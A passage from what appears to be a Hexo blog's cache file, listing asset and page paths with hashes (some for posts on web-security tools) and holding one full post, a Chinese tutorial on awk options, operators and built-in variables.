f58d2bcb1b2bfc7","modified":1534675362163},{"_id":"themes/yilia/source-src/css/core/_variables.scss","hash":"6e75bdaa46de83094ba0873099c6e7d656a22453","modified":1534675362175},{"_id":"themes/yilia/source-src/css/fonts/iconfont.svg","hash":"75767c904d483d9b93469afb6b92bb6bdface639","modified":1534675362182},{"_id":"themes/yilia/source-src/css/fonts/iconfont.eot","hash":"bc8c5e88f4994a852041b4d83f126d9c4d419b4a","modified":1534675362180},{"_id":"themes/yilia/source-src/css/core/_reset.scss","hash":"398a49913b4a47d928103562b1ce94520be4026a","modified":1534675362173},{"_id":"themes/yilia/source-src/css/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1534675362217},{"_id":"themes/yilia/source-src/css/fonts/iconfont.woff","hash":"aa9672cb097f7fd73ae5a03bcd3d9d726935bc0a","modified":1534675362187},{"_id":"themes/yilia/source-src/css/img/tooltip.svg","hash":"397fe4b1093bf9b62457dac48aa15dac06b54a3c","modified":1534675362223},{"_id":"themes/yilia/source-src/css/img/checkered-pattern.png","hash":"049262fa0886989d750637b264bed34ab51c23c8","modified":1534675362210},{"_id":"themes/yilia/source-src/css/fonts/iconfont.ttf","hash":"f342ac8bf4d937f42a7d6a0032ad267ab47eb7f2","modified":1534675362185},{"_id":"themes/yilia/.git/objects/pack/pack-52418c40383c20ef5b05d15328dbbf33f9454802.idx","hash":"4d041f4766a30c4e3f2bd8aa886f1ca70f67778e","modified":1534675361731},{"_id":"source/images/security/burpsuite/burpsuite_intruder_03.png","hash":"2b3a99ebb2f98d01022538165dd6f15274451514","modified":1544695804230},{"_id":"source/images/security/burpsuite/burpsuite_intruder_04.png","hash":"f872af211d5c35ef50ac45d2bcf79386a80ea1b6","modified":1544695843502},{"_id":"source/images/security/burpsuite/proxy_chain_01.png","hash":"05d4e838bec318c5f1eac6e59ee5e2b03c150e41","modified":1545297393206},{"_id":"source/images/security/burpsuite/burpsuite_intruder_02.png","hash":"6037d3bbf22fbe3af3327f7a513d8de5d3f03564","modified":1544695738414},{"_id":"source/images/security/burpsuite/usr005tv_package_2.png","hash":"4740490602f585c6182111f648eadcb62617729b","modified":1544596899871},{"_id":"source/images/security/burpsuite/usr005tv_package_3.png","hash":"ff71134a3099a2e40adc35959344af573f9b10d1","modified":1544596945919},{"_id":"themes/yilia/.git/refs/heads/master","hash":"4ed77da1a2617db0e77c3e3e190a1c79c16dfb9a","modified":1534675361984},{"_id":"source/images/security/example/studentid_search_03.png","hash":"648e3376c210562ef0b150708ad343a4ebbba9a4","modified":1545116742827},{"_id":"source/images/security/burpsuite/dvwn_login_1.png","hash":"6e7768683a79155547610b36b1a9305247832b9b","modified":1544695442454},{"_id":"source/images/security/example/search_page.png","hash":"83521f50991b11e02ace23c5f7c2fd280bbbfd05","modified":1545120388367},{"_id":"source/images/security/example/studentid_search_01.png","hash":"742e66af10edaf38ca98843ae22649bc6024bc1d","modified":1545120861146},{"_id":"source/images/security/burpsuite/usr005tv_login_page1.png","hash":"50179359523adf2ae2cfd4ac9af90b56aa42e5c2","modified":1544596405848},{"_id":"themes/yilia/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1534675361975},{"_id":"themes/yilia/.git/logs/refs/heads/master","hash":"ae7e774aee915bc1eab380f3e16a1332d5bfe189","modified":1534675361989},{"_id":"source/images/security/example/password_modify.png","hash":"db7f2251e6ba3574544e2da7559fe8b774b70bb6","modified":1545118377675},{"_id":"source/images/security/example/login_success.png","hash":"569df53ae16019b65562c4335cf204b9f9ef0072","modified":1545118519500},{"_id":"themes/yilia/.git/logs/refs/remotes/origin/HEAD","hash":"ae7e774aee915bc1eab380f3e16a1332d5bfe189","modified":1534675361975},{"_id":"source/images/security/example/studentid_search_02.png","hash":"44abe15f7a9ff93ae5259a286fcf3a35ca728ddf","modified":1545120889379},{"_id":"source/images/security/example/login_page.png","hash":"910518bb438fb258a74982bf6c173612e6033ab3","modified":1545120585811},{"_id":"source/images/security/sql_inject_yangan_01.png","hash":"f22ddd14d93747d78971e1645554a234b3dafe93","modified":1545026540177},{"_id":"source/images/security/example/index_page.png","hash":"1d9ff07b7e040d50d015d71355ca35781675b68a","modified":1545120054813},{"_id":"themes/yilia/.git/objects/pack/pack-52418c40383c20ef5b05d15328dbbf33f9454802.pack","hash":"5c2000a86715c8182a6dbd9e1819fbcc53e87d08","modified":1534675361858},{"_id":"public/content.json","hash":"042be78b2957a3b249d3ec712f07b94a62844d42","modified":1548061766327},{"_id":"public/2018/12/18/security/example/cdnu-example-login/index.html","hash":"5216b62456176e4fc59359a0fc8b39ac7299e958","modified":1548061766937},{"_id":"public/2018/11/28/mavenmultiplemodules/index.html","hash":"2c6e513b552b4270ba08b271f4ff6f1bf2fbcf5c","modified":1548061767170},{"_id":"public/2018/11/23/java/springbootdemo/index.html","hash":"ce7186ac170e0e164baeb0aa864b69b9f059b2ba","modified":1548061767196},{"_id":"public/2018/11/19/java/spring-schdule/index.html","hash":"6c780538b0c1dea37b00a2253541ce9310441d9f","modified":1548061767197},{"_id":"public/2018/11/15/java/泛型/index.html","hash":"f136d59dcdb477e63ce00e317f50532013f73b8c","modified":1548061767197},{"_id":"public/2018/11/07/java/reflect/index.html","hash":"5655790906dbef6c2e990876cb4d2dbef8fcbadc","modified":1548061767197},{"_id":"public/2018/11/07/java/factorypattern/index.html","hash":"4c0bd6a89b066bad1de9e4ef4cc5e5daef235fc8","modified":1548061767197},{"_id":"public/2018/11/06/security/xss/index.html","hash":"f39a6075601f3cb283b6a26f9d12bcf07163779e","modified":1548061767197},{"_id":"public/2018/10/31/java/java单例/index.html","hash":"cdbb91d6d3dab0557330c90e30cb8f6317ac1a69","modified":1548061767198},{"_id":"public/2018/10/17/java/spring-tomcat/index.html","hash":"dd5e022a51b978f62ace2db2bf2584fde623599d","modified":1548061767198},{"_id":"public/2018/10/10/正则/index.html","hash":"0444a31d74b2d9dd6edabd7ad5444782c4015248","modified":1548061767198},{"_id":"public/2018/10/10/security/googlehacking/index.html","hash":"a8526b781a58082370094cfadaeafb73cf3763c1","modified":1548061767198},{"_id":"public/2018/09/28/java/tomcat-redis-session/index.html","hash":"b903dd05fbb1b06ae5dd81fc590458f13899f1bd","modified":1548061767198},{"_id":"public/2018/09/26/java/javasocket/index.html","hash":"414f155d4e64ccb277047bf8b08b071b85d82f95","modified":1548061767198},{"_id":"public/2018/09/21/java/spring/index.html","hash":"dcc72317dce25fb6f1cbf97e7586b3f96f5c75fa","modified":1548061767199},{"_id":"public/2018/09/21/java/java基本类型/index.html","hash":"f718a7e8a78e00612981a355f01c192860ba9aa2","modified":1548061767199},{"_id":"public/2018/09/21/java/java面向对象/index.html","hash":"8787ac285f3adaadf452ee8e0cd0c74541a7a35f","modified":1548061767199},{"_id":"public/2018/09/17/nginx/index.html","hash":"d055fb89cd5b6d9b757930ee3ecb3b36c8fe569b","modified":1548061767199},{"_id":"public/2018/09/17/java/springboot-redis/index.html","hash":"ea429ce8bbc44217dc0fd4db7866b6426cbad081","modified":1548061767199},{"_id":"public/2018/09/04/sgip/index.html","hash":"ee58020b040ba011a2b908a2e464e7d5d0587991","modified":1548061767199},{"_id":"public/2018/08/30/java/RestTemplate/index.html","hash":"83affc258cb448712910226af6e81f3c34984da0","modified":1548061767200},{"_id":"public/2018/08/30/java/Spring上下文/index.html","hash":"80de2686b6c1fff7c618d8f8623ee6ac101b7719","modified":1548061767200},{"_id":"public/2018/08/28/security/sql/sqlmap/index.html","hash":"6f049d2ddb976d2a0bebc09226d69bfca9da1167","modified":1548061767200},{"_id":"public/2018/08/28/security/sql/sql注入/index.html","hash":"58074087e67022fb433635b04d84ba53feab54b1","modified":1548061767200},{"_id":"public/2018/08/20/reinstall/index.html","hash":"8fc01670e19c1f15dc8c78c736eaae6eaeddd23f","modified":1548061767200},{"_id":"public/archives/index.html","hash":"8763d2ce511784e5e22f0023cb8c56bf67bfa8a9","modified":1548061767201},{"_id":"public/archives/page/3/index.html","hash":"2fe882b2faa1379401a25c631758a8fc7e7cf1b6","modified":1548061767201},{"_id":"public/2018/12/12/security/burpsuite/index.html","hash":"2b41ecb3b786c7fd83c7cb77227ec3516a584c3d","modified":1548061767201},{"_id":"public/archives/2018/index.html","hash":"9f4fd2d85f0cdc15d687f7dacf893f4be575c76e","modified":1548061767201},{"_id":"public/archives/2018/page/3/index.html","hash":"dd3d39405f9dd644c290a44874e3949a92b6a1cd","modified":1548061767201},{"_id":"public/archives/2018/08/index.html","hash":"b9a07408a400a27cef23748263a016772359b218","modified":1548061767201},{"_id":"public/archives/2018/09/index.html","hash":"d522631d5a3153106a2abca4811ee50a54795c2c","modified":1548061767202},{"_id":"public/archives/2018/10/index.html","hash":"c0e20a0ef3482a77cfe338a2296890408d0ccd2b","modified":1548061767202},{"_id":"public/archives/2018/11/index.html","hash":"47c1fe0b2750491ea99dab13a466a8d11d53229b","modified":1548061767202},{"_id":"public/archives/2018/12/index.html","hash":"e7556436ff7af9d2ad190b5ced9212c8671966a8","modified":1548061767202},{"_id":"public/index.html","hash":"08da7c54e94456f9a9dc3328bc9ec1836ea1711e","modified":1548061767202},{"_id":"public/2019/01/21/java/interface/index.html","hash":"b7d4c1399162f76c56b7823ea6b8daed61c23cd7","modified":1548061767234},{"_id":"public/2019/01/17/netcat/index.html","hash":"2ae181398770dfc2405262c4ea07d1eec1158d18","modified":1548061767257},{"_id":"public/2019/01/16/tools/docker/index.html","hash":"8a541dfef86804c096b1d8ed00de80312324e518","modified":1548061767262},{"_id":"public/2019/01/15/wheels/java/hashutil/index.html","hash":"ccad65f3d442db5edc206343c740af3519e72eda","modified":1548061767262},{"_id":"public/2018/12/31/awk/index.html","hash":"ee1dd3ffd1fd4065b2c1e991617e245e3df6ac20","modified":1548061767262},{"_id":"public/2019/01/16/tools/vim/index.html","hash":"a14169a8f2708dbbe5139be17f2eb62da12012d2","modified":1548061767262},{"_id":"public/2019/01/15/wheels/java/httpclient/index.html","hash":"b7d05956e030cedf31a084dd24be472277358a79","modified":1548061767262},{"_id":"public/archives/page/4/index.html","hash":"474a5e1668bc3c8ad24fbe91a943185c2b637a0e","modified":1548061767262},{"_id":"public/archives/2019/index.html","hash":"470106fb6dfbdfcc0e159d95112867216a5edc41","modified":1548061767263},{"_id":"public/archives/2019/01/index.html","hash":"fb52cd4f5056bf17bd612121f962a1644791f840","modified":1548061767263},{"_id":"public/2018/12/24/http与socket/index.html","hash":"792a1fdf4255b01e32cb18c0e4553c1dec3fc796","modified":1548061767263},{"_id":"public/page/3/index.html","hash":"f82d9a391b80b8b59c3f8b033ce36f1115db8b2f","modified":1548061767263},{"_id":"public/tags/socket/index.html","hash":"19ece2cc462908c4d274a6d57d50969825c01dd0","modified":1548061767263},{"_id":"public/tags/正则/index.html","hash":"b657c5d4c59c0b9f0a671551e9ad431d7fb6c8ce","modified":1548061767264},{"_id":"public/tags/sgip/index.html","hash":"7954167b70f08bc0c90461018d1a829ef792b0b5","modified":1548061767264},{"_id":"public/tags/java/index.html","hash":"54f827fc830fc6685438865ad666fc0a9d099186","modified":1548061767264},{"_id":"public/tags/java/page/2/index.html","hash":"d00232ee5bebd8b17bea16449986701e2965f1a1","modified":1548061767264},{"_id":"public/tags/hexo/index.html","hash":"6460d945db2df30bc27975e8a1e95bf7def742cb","modified":1548061767264},{"_id":"public/tags/nginx/index.html","hash":"2048e89aca318d36c30a6f7dc6736c77f50e2807","modified":1548061767265},{"_id":"public/tags/springboot/index.html","hash":"d254bd31505e0290be82ab01e8adf0b3bbc90028","modified":1548061767265},{"_id":"public/tags/tomcat/index.html","hash":"db584785b1ca5d5f867dee8d122aa9ed1c038c97","modified":1548061767265},{"_id":"public/tags/spring/index.html","hash":"965c69e2ebf5275909625b7c045564689e64f2bd","modified":1548061767265},{"_id":"public/tags/渗透/index.html","hash":"f2d2bed81b1ac1fedb09a7bce8df8faeb3935199","modified":1548061767265},{"_id":"public/tags/google/index.html","hash":"787455fb3bb90a1b8533da463e80ac1aafb5d4be","modified":1548061767265},{"_id":"public/tags/burpsuite/index.html","hash":"39e858d775798f509a2895fbfd77fb7c5a440841","modified":1548061767266},{"_id":"public/tags/sql注入/index.html","hash":"802473434038a706b385b5d41639c5ce8a2aea01","modified":1548061767266},{"_id":"public/archives/page/2/index.html","hash":"435075890333370bdf24d52299cc38b69611a182","modified":1548061767266},{"_id":"public/archives/2018/page/2/index.html","hash":"4244bde5dde3d217907da990bc4dd86106faad3d","modified":1548061767266},{"_id":"public/page/2/index.html","hash":"cd322ee20aac07d8a2ba880072aa4c3bd808854a","modified":1548061767266},{"_id":"public/temp","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1548061767266},{"_id":"public/page/4/index.html","hash":"0c30d442044d141f00fdd3c774d2f673b5ef58ea","modified":1548061767272},{"_id":"public/tags/linux/index.html","hash":"e028c30931d6f3aa0a535b9c168fe9743f4ff9dd","modified":1548061767272},{"_id":"public/tags/tools/index.html","hash":"9fdc033bcd80807d2d9a7230033c3678ce949577","modified":1548061767272},{"_id":"public/tags/wheels/index.html","hash":"425cb4ebc980da0899107d25088e5e387e696a13","modified":1548061767272},{"_id":"public/images/1.png","hash":"802748484633c8fc967352a1407a242dbe1ec6e8","modified":1548061767272},{"_id":"public/images/redis.png","hash":"17fde6abd3d85875d501f049f43f3aeb80afd46a","modified":1548061767272},{"_id":"public/images/report1.jpg","hash":"3676dcf43f2771f3582785739fcc25aef291d84f","modified":1548061767273},{"_id":"public/images/socketclient.png","hash":"c7f49dc7f83fa348bc208d98741357b8309b986f","modified":1548061767273},{"_id":"public/images/tomcat2.png","hash":"8e28b345407c496942dd4396c0f43f56a3326b08","modified":1548061767273},{"_id":"public/images/tomcat1.png","hash":"3b8d5a451a6552d2e014ee467097333c27ca0df4","modified":1548061767273},{"_id":"public/images/socketserver.png","hash":"c965e70248de228aaee622358c4985c6977d08cf","modified":1548061767273},{"_id":"public/fonts/default-skin.b257fa.svg","hash":"2ac727c9e092331d35cce95af209ccfac6d4c7c7","modified":1548061767273},{"_id":"public/fonts/iconfont.45d7ee.svg","hash":"75767c904d483d9b93469afb6b92bb6bdface639","modified":1548061767273},{"_id":"public/fonts/iconfont.8c627f.woff","hash":"aa9672cb097f7fd73ae5a03bcd3d9d726935bc0a","modified":1548061767273},{"_id":"public/fonts/tooltip.4004ff.svg","hash":"397fe4b1093bf9b62457dac48aa15dac06b54a3c","modified":1548061767274},{"_id":"public/img/default-skin.png","hash":"ed95a8e40a2c3478c5915376acb8e5f33677f24d","modified":1548061767274},{"_id":"public/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1548061767274},{"_id":"public/fonts/iconfont.b322fa.eot","hash":"bc8c5e88f4994a852041b4d83f126d9c4d419b4a","modified":1548061767274},{"_id":"public/img/preloader.gif","hash":"6342367c93c82da1b9c620e97c84a389cc43d96d","modified":1548061767274},{"_id":"public/fonts/iconfont.16acc2.ttf","hash":"f342ac8bf4d937f42a7d6a0032ad267ab47eb7f2","modified":1548061767275},{"_id":"public/images/security/burpsuite/burpsuite_ca_certificate.png","hash":"41bceb7477b87b5bdde5586fee1bb2c669fe2c29","modified":1548061767275},{"_id":"public/images/security/burpsuite/ca_certificate_install.png","hash":"1f178db62fa008ed1f154d1b8624d813c46afc21","modified":1548061767275},{"_id":"public/images/security/burpsuite/burpsuite_proxy.png","hash":"a7fde5387c9f906490106c13432c62605f5d6b8e","modified":1548061767275},{"_id":"public/images/security/burpsuite/chrome_proxy.png","hash":"d6de982c707d27f62cc186e306ee4ffdbc3b6ee5","modified":1548061767275},{"_id":"public/images/security/burpsuite/chrome_proxy2.png","hash":"f3dcf1cbcdbcadc0e5338a02cb80dbbe93f0cb06","modified":1548061767275},{"_id":"public/images/security/burpsuite/usr005tv_package_1.png","hash":"dd93c590c54d9f94d410fe58009a22565c2448b5","modified":1548061767275},{"_id":"public/images/security/burpsuite/burpsuite_intruder_01.png","hash":"432ae35419e626725d88a50e2f5943472b7710f3","modified":1548061767276},{"_id":"public/images/security/example/code_logic.png","hash":"157565c1ad0e52ab57cc0e91a4b09449016aa5c0","modified":1548061767276},{"_id":"public/images/security/example/code_logic_02.png","hash":"f5ecd488e2cf9eb367911fde92916f723fbf8995","modified":1548061767276},{"_id":"public/images/security/example/password_success.png","hash":"84028cfbe4e99543bf70ec28bb82326794cedd87","modified":1548061767276},{"_id":"public/images/security/burpsuite/usr005tv_register1.png","hash":"75e8d9e04f4ed1b143a5fa2d8b15044ef0bec479","modified":1548061767276},{"_id":"public/images/security/sql/youarein.png","hash":"287757258adb6fd1bc3012c07ed03954c91ff234","modified":1548061767276},{"_id":"public/images/osi_七层模型.jpg","hash":"4fee8f40f5e0b483254b239b84241025089fddb6","modified":1548061767276},{"_id":"public/images/2.png","hash":"3dbd8f1120825542130541b1200621a4b4d7d4f0","modified":1548061767296},{"_id":"public/images/report2.jpg","hash":"9c80c5b46378e0a8d84a8662a9644d176efa9909","modified":1548061767296},{"_id":"public/images/security/burpsuite/burpsuite_intruder_03.png","hash":"2b3a99ebb2f98d01022538165dd6f15274451514","modified":1548061767296},{"_id":"public/images/security/burpsuite/burpsuite_intruder_04.png","hash":"f872af211d5c35ef50ac45d2bcf79386a80ea1b6","modified":1548061767296},{"_id":"public/images/security/burpsuite/proxy_chain_01.png","hash":"05d4e838bec318c5f1eac6e59ee5e2b03c150e41","modified":1548061767296},{"_id":"public/images/security/burpsuite/usr005tv_package_2.png","hash":"4740490602f585c6182111f648eadcb62617729b","modified":1548061767296},{"_id":"public/images/security/burpsuite/usr005tv_package_3.png","hash":"ff71134a3099a2e40adc35959344af573f9b10d1","modified":1548061767297},{"_id":"public/images/security/example/studentid_search_03.png","hash":"648e3376c210562ef0b150708ad343a4ebbba9a4","modified":1548061767297},{"_id":"public/images/security/burpsuite/dvwn_login_1.png","hash":"6e7768683a79155547610b36b1a9305247832b9b","modified":1548061767297},{"_id":"public/images/security/burpsuite/burpsuite_intruder_02.png","hash":"6037d3bbf22fbe3af3327f7a513d8de5d3f03564","modified":1548061767297},{"_id":"public/images/3.png","hash":"a7a48a74314124175afff7fef457f352bbb6c7a6","modified":1548061767330},{"_id":"public/images/security/example/search_page.png","hash":"83521f50991b11e02ace23c5f7c2fd280bbbfd05","modified":1548061767330},{"_id":"public/images/security/example/studentid_search_01.png","hash":"742e66af10edaf38ca98843ae22649bc6024bc1d","modified":1548061767330},{"_id":"public/images/security/burpsuite/usr005tv_login_page1.png","hash":"50179359523adf2ae2cfd4ac9af90b56aa42e5c2","modified":1548061768289},{"_id":"public/images/security/example/password_modify.png","hash":"db7f2251e6ba3574544e2da7559fe8b774b70bb6","modified":1548061768820},{"_id":"public/images/security/example/login_success.png","hash":"569df53ae16019b65562c4335cf204b9f9ef0072","modified":1548061768820},{"_id":"public/images/security/example/studentid_search_02.png","hash":"44abe15f7a9ff93ae5259a286fcf3a35ca728ddf","modified":1548061769054},{"_id":"public/slider.e37972.js","hash":"6dec4e220c89049037eebc44404abd8455d22ad7","modified":1548061769207},{"_id":"public/main.0cf68a.css","hash":"ddf6e2c6b953c2c59a3c271e6070010a4cc81cf9","modified":1548061769258},{"_id":"public/images/security/example/login_page.png","hash":"910518bb438fb258a74982bf6c173612e6033ab3","modified":1548061769280},{"_id":"public/main.0cf68a.js","hash":"993fadeb5f6d296e9d997a49ee20dc97333ceab7","modified":1548061769353},{"_id":"public/images/security/sql_inject_yangan_01.png","hash":"f22ddd14d93747d78971e1645554a234b3dafe93","modified":1548061769391},{"_id":"public/mobile.992cbe.js","hash":"01b35e71e37aa2849664eb5daf26daede2278398","modified":1548061769395},{"_id":"public/images/security/example/index_page.png","hash":"1d9ff07b7e040d50d015d71355ca35781675b68a","modified":1548061769550}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"awk用法","date":"2018-12-31T03:55:31.000Z","_content":"#### 1.awk\n用于处理文本\n#### 2.用法\n参考[菜鸟教程](http://www.runoob.com/linux/linux-comm-awk.html)\n```\nawk [选项参数] 'script' var=value file(s)\n或\nawk [选项参数] -f scriptfile var=value file(s)\n```\n###### 1.选项参数\n- -F fs or --field-separator fs<br>\n指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br>\n\n```\nawk -F, '{print $1,$2}' xxx.txt\n以逗号为分隔符，打印第一第二列\n```\n- -v var=value or --asign var=value\n赋值一个用户定义变量。\n\n```\nawk -va=1 '{print $1,$1+a}' xxx.txt\n设置a为变量，打印第一和a+1列\n```\n###### 2.运算符\n```\n= += -= *= /= %= ^= **=\t赋值\n?:\tC条件表达式\n||\t逻辑或\n&&\t逻辑与\n~ ~!\t匹配正则表达式和不匹配正则表达式\n< <= > >= != ==\t关系运算符\n空格\t连接\n+ -\t加，减\n* / %\t乘，除与求余\n+ - !\t一元加，减和逻辑非\n^ ***\t求幂\n++ --\t增加或减少，作为前缀或后缀\n$\t字段引用\nin\t数组成员\n```\n```\nawk '$1>2' xxx.txt\n输出第一列大于2的行\nawk -F, '$1>2' xxx.txt\n输出第一列大于2的行(字符串也会进行比较 例:value1-2 > 2)\nvalue1-1 + value1-2 = 0?\nawk -F, '$1=2' xxx.txt\n将第一列赋值为2\nawk '$1>2 && $2==\"Are\" {print $1,$2,$3}' xxx.txt\n第一列大于2并且第二列等于'Are'的行,输出第一二三列\n```\n\n###### 3.内建变量\n```\n$n\t当前记录的第n个字段，字段间由FS分隔\n$0\t完整的输入记录\nARGC\t命令行参数的数目\nARGIND\t命令行中当前文件的位置(从0开始算)\nARGV\t包含命令行参数的数组\nCONVFMT\t数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组\nERRNO\t最后一个系统错误的描述\nFIELDWIDTHS\t字段宽度列表(用空格键分隔)\nFILENAME\t当前文件名\nFNR\t各文件分别计数的行号\nFS\t字段分隔符(默认是任何空格)\nIGNORECASE\t如果为真，则进行忽略大小写的匹配\nNF\t一条记录的字段的数目\nNR\t已经读出的记录数，就是行号，从1开始\nOFMT\t数字的输出格式(默认值是%.6g)\nOFS\t输出记录分隔符（输出换行符），输出时用指定的符号代替换行符\nORS\t输出记录分隔符(默认值是一个换行符)\nRLENGTH\t由match函数所匹配的字符串的长度\nRS\t记录分隔符(默认是一个换行符)\nRSTART\t由match函数所匹配的字符串的第一个位置\nSUBSEP\t数组下标分隔符(默认值是/034)\n```\n","source":"_posts/awk.md","raw":"---\ntitle: awk用法\ndate: 2018-12-31 11:55:31\ntags: [linux]\n---\n#### 1.awk\n用于处理文本\n#### 2.用法\n参考[菜鸟教程](http://www.runoob.com/linux/linux-comm-awk.html)\n```\nawk [选项参数] 'script' var=value file(s)\n或\nawk [选项参数] -f scriptfile var=value file(s)\n```\n###### 1.选项参数\n- -F fs or --field-separator fs<br>\n指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br>\n\n```\nawk -F, '{print $1,$2}' xxx.txt\n以逗号为分隔符，打印第一第二列\n```\n- -v var=value or --asign var=value\n赋值一个用户定义变量。\n\n```\nawk -va=1 '{print $1,$1+a}' xxx.txt\n设置a为变量，打印第一和a+1列\n```\n###### 2.运算符\n```\n= += -= *= /= %= ^= **=\t赋值\n?:\tC条件表达式\n||\t逻辑或\n&&\t逻辑与\n~ ~!\t匹配正则表达式和不匹配正则表达式\n< <= > >= != ==\t关系运算符\n空格\t连接\n+ -\t加，减\n* / %\t乘，除与求余\n+ - !\t一元加，减和逻辑非\n^ ***\t求幂\n++ --\t增加或减少，作为前缀或后缀\n$\t字段引用\nin\t数组成员\n```\n```\nawk '$1>2' xxx.txt\n输出第一列大于2的行\nawk -F, '$1>2' xxx.txt\n输出第一列大于2的行(字符串也会进行比较 例:value1-2 > 2)\nvalue1-1 + value1-2 = 0?\nawk -F, '$1=2' xxx.txt\n将第一列赋值为2\nawk '$1>2 && $2==\"Are\" {print $1,$2,$3}' xxx.txt\n第一列大于2并且第二列等于'Are'的行,输出第一二三列\n```\n\n###### 3.内建变量\n```\n$n\t当前记录的第n个字段，字段间由FS分隔\n$0\t完整的输入记录\nARGC\t命令行参数的数目\nARGIND\t命令行中当前文件的位置(从0开始算)\nARGV\t包含命令行参数的数组\nCONVFMT\t数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组\nERRNO\t最后一个系统错误的描述\nFIELDWIDTHS\t字段宽度列表(用空格键分隔)\nFILENAME\t当前文件名\nFNR\t各文件分别计数的行号\nFS\t字段分隔符(默认是任何空格)\nIGNORECASE\t如果为真，则进行忽略大小写的匹配\nNF\t一条记录的字段的数目\nNR\t已经读出的记录数，就是行号，从1开始\nOFMT\t数字的输出格式(默认值是%.6g)\nOFS\t输出记录分隔符（输出换行符），输出时用指定的符号代替换行符\nORS\t输出记录分隔符(默认值是一个换行符)\nRLENGTH\t由match函数所匹配的字符串的长度\nRS\t记录分隔符(默认是一个换行符)\nRSTART\t由match函数所匹配的字符串的第一个位置\nSUBSEP\t数组下标分隔符(默认值是/034)\n```\n","slug":"awk","published":1,"updated":"2019-01-04T08:24:02.465Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr6404ys00006cvpxid54wwf","content":"<h4 id=\"1-awk\"><a href=\"#1-awk\" class=\"headerlink\" title=\"1.awk\"></a>1.awk</h4><p>用于处理文本</p>\n<h4 id=\"2-用法\"><a href=\"#2-用法\" class=\"headerlink\" title=\"2.用法\"></a>2.用法</h4><p>参考<a href=\"http://www.runoob.com/linux/linux-comm-awk.html\" target=\"_blank\" rel=\"noopener\">菜鸟教程</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk [选项参数] &apos;script&apos; var=value file(s)</span><br><span class=\"line\">或</span><br><span class=\"line\">awk [选项参数] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-选项参数\"><a href=\"#1-选项参数\" class=\"headerlink\" title=\"1.选项参数\"></a>1.选项参数</h6><ul>\n<li>-F fs or –field-separator fs<br><br>指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -F, &apos;&#123;print $1,$2&#125;&apos; xxx.txt</span><br><span class=\"line\">以逗号为分隔符，打印第一第二列</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-v var=value or –asign var=value<br>赋值一个用户定义变量。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -va=1 &apos;&#123;print $1,$1+a&#125;&apos; xxx.txt</span><br><span class=\"line\">设置a为变量，打印第一和a+1列</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-运算符\"><a href=\"#2-运算符\" class=\"headerlink\" title=\"2.运算符\"></a>2.运算符</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">= += -= *= /= %= ^= **=\t赋值</span><br><span class=\"line\">?:\tC条件表达式</span><br><span class=\"line\">||\t逻辑或</span><br><span class=\"line\">&amp;&amp;\t逻辑与</span><br><span class=\"line\">~ ~!\t匹配正则表达式和不匹配正则表达式</span><br><span class=\"line\">&lt; &lt;= &gt; &gt;= != ==\t关系运算符</span><br><span class=\"line\">空格\t连接</span><br><span class=\"line\">+ -\t加，减</span><br><span class=\"line\">* / %\t乘，除与求余</span><br><span class=\"line\">+ - !\t一元加，减和逻辑非</span><br><span class=\"line\">^ ***\t求幂</span><br><span class=\"line\">++ --\t增加或减少，作为前缀或后缀</span><br><span class=\"line\">$\t字段引用</span><br><span class=\"line\">in\t数组成员</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk &apos;$1&gt;2&apos; xxx.txt</span><br><span class=\"line\">输出第一列大于2的行</span><br><span class=\"line\">awk -F, &apos;$1&gt;2&apos; xxx.txt</span><br><span class=\"line\">输出第一列大于2的行(字符串也会进行比较 例:value1-2 &gt; 2)</span><br><span class=\"line\">value1-1 + value1-2 = 0?</span><br><span class=\"line\">awk -F, &apos;$1=2&apos; xxx.txt</span><br><span class=\"line\">将第一列赋值为2</span><br><span class=\"line\">awk &apos;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&apos; xxx.txt</span><br><span class=\"line\">第一列大于2并且第二列等于&apos;Are&apos;的行,输出第一二三列</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-内建变量\"><a href=\"#3-内建变量\" class=\"headerlink\" title=\"3.内建变量\"></a>3.内建变量</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span 